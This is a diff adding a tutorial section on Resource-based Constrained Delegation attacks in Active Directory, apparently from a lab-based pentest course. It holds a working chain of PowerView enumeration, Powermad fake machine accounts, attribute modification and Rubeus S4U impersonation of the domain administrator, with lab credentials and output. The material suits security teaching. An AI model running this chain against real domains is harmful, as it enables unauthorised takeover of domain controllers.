@@ -1639,3 +1639,240 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
+## Resource-based Constrained Delegation (_RBCD_)
+
+### From Windows
+
+Resource-based constrained delegation was introduced with Windows Server 2012. This type of delegation allows delegation settings to be configured on the target service instead of the service account being used to access resources.
+
+RBCD relies on security descriptors instead of an allowed list of SPNs. An administrator defines which security principals can request Kerberos tickets for a user. When a service receives a request to grant access on behalft of another user, the KDC checks against the security descriptors in the `msDS-AllowedToActOnBehaltOfOtherIdentity` attribute of the principal running the backend service.
+
+If the security descriptor of the backend service matches that of the frontend service, then access will be granted. RBCD works regardless of the domain functional level but does require at least one DC running Windows Server 2012 or later in the same domain as both the backend and frontend servers.
+
+To carry out attacks against RBCD, you require two elements:
+
+1. Access to a user or group that has privileges to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on a computer. This is commonly possible if the user has `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` privileges on a computer object.
+2. Control of another object that has an SPN.
+
+The following PowerShell script will check computers in the domain and users that have the required access rights on them.
+
+```powershell
+# import the PowerView module
+Import-Module C:\Tools\PowerView.ps1
+
+# get all computers in the domain
+$computers = Get-DomainComputer
+
+# get all users in the domain
+$users = Get-DomainUser
+
+# define the required access rights
+$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
+
+# loop through each computer in the domain
+foreach ($computer in $computers) {
+    # get the security descriptor for the computer
+    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
+
+    # loop through each user in the domain
+    foreach ($user in $users) {
+        # check if the user has the required access rights on the computer object
+        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
+
+        if ($hasAccess) {
+            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
+        }
+    }
+}
+```
+
+```powershell
+PS C:\Tools> .\SearchRBCD.ps1
+
+carole.holmes has the required access rights on DC01
+```
+
+You already have the user `carole.holmes` who has privileges on DC01. The simplest way to obtain an object with SPN is to use a computer. You can use a computer on which you already have administrator privileges, or if you do not have such rights, you could create a fake computer.
+
+To create a fake computer, you first need to create a computer account, which is possible because `ms-DS-MachineAccountQuota` is set to 10 by default for authenticated users. You can make your fake computer using the [PowerMad](https://github.com/Kevin-Robertson/Powermad) script.
+
+```powershell
+PS C:\Tools> Import-Module .\Powermad.ps1
+PS C:\Tools> New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
+
+[+] Machine account HACKTHEBOX added
+```
+
+Then, you add this computer account to the trust list of the targeted computer, which is possible because the attacker has `GenericAll ACL` on this computer:
+
+1. Obtain the computer SID
+2. Use the [SDDL](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) to create a security descriptor
+3. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` in raw binary format
+4. Modify the target computer
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
+PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
+PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL'
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
+VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0
+36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 7 43 120 111
+218 117 136 70 100 139 92 35 55 8 0 0' for object 'DC01$'
+```
+
+You can ask for a TGT for the created computer, followed by a `S4U2Self` request to get a forwardable TGS ticket, and then a `S42UProxy` to get a valid TGS ticket for a specific SPN on the targeted computer.  But first, get the NT hash of your computer account.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Hackthebox123+!
+[*] Input username             : HACKTHEBOX$
+[*] Input domain               : inlanefreight.local
+[*] Salt                       : INLANEFREIGHT.LOCALhosthackthebox.inlanefreight.local
+[*]       rc4_hmac             : CF767C9A9C529361F108AA67BF1B3695
+[*]       aes128_cts_hmac_sha1 : 91BE80CCB5F58A8F18960858524B6EC6
+[*]       aes256_cts_hmac_sha1 : 9457C7FC2D222793B1871EE4E62FEFB1CE158B719F99B6C992D7DC9FFB625D97
+[*]       des_cbc_md5          : 5B516BDA5180E5CB
+```
+
+Now that you have your newly created computer account's password hash, you request a TGS ticket for the service `cifs/dc01.inlanefreight.local`, allowing you to access the target using SMB.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: CF767C9A9C529361F108AA67BF1B3695
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\HACKTHEBOX$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFWjCCBVagAwIBBaE<SNIP>
+
+
+[*] Action: S4U
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2self request for: 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'administrator@INLANEFREIGHT.LOCAL' to 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGEjCCBg6gAwIBBaED<SNIP>
+
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.inlanefreight.local'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2proxy request for service: 'cifs/dc01.inlanefreight.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc01.inlanefreight.local':
+
+      doIHEDCCBwygAwIBBaEDA<SNIP>
+        
+[+] Ticket successfully imported!
+```
+
+You have received your ticket.
+
+> [!NOTE]
+> You can also use `/altservice:host,RPCSS,wsman,http,ldap,krbtgt,ldap` to include aditional services to your ticket request.
+> 
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0xff74b0
+
+Cached Tickets: (1)
+
+#0>     Client: administrator @ INLANEFREIGHT.LOCAL
+        Server: cifs/dc01.inlanefreight.local @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 8/25/2020 18:00:26 (local)
+        End Time:   8/26/2020 4:00:26 (local)
+        Renew Time: 9/1/2020 18:00:26 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+Now you can list the files on the target as Administrator.
+
+```powershell
+PS C:\Tools> ls \\dc01.inlanefreight.local\c$
+
+    Directory: \\dc01.inlanefreight.local\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2022  10:20 AM                PerfLogs
+d-r---        10/6/2021   3:50 PM                Program Files
+d-----        9/15/2018   4:06 AM                Program Files (x86)
+d-----        3/30/2023  11:08 AM                Shares
+d-----        3/30/2023   3:13 PM                Unconstrained
+d-r---         4/3/2023   8:56 AM                Users
+d-----       10/14/2022   6:49 AM                Windows
+```
+
+To clear the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity`, you can use the following PowerShell commands:
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL'
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
+VERBOSE: [Set-DomainObject] Clearing 'msDS-AllowedToActOnBehalfOfOtherIdentity' for object 'DC01$'
+```
+
+Further reads:
+
+- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+- https://blog.harmj0y.net/blog/
+
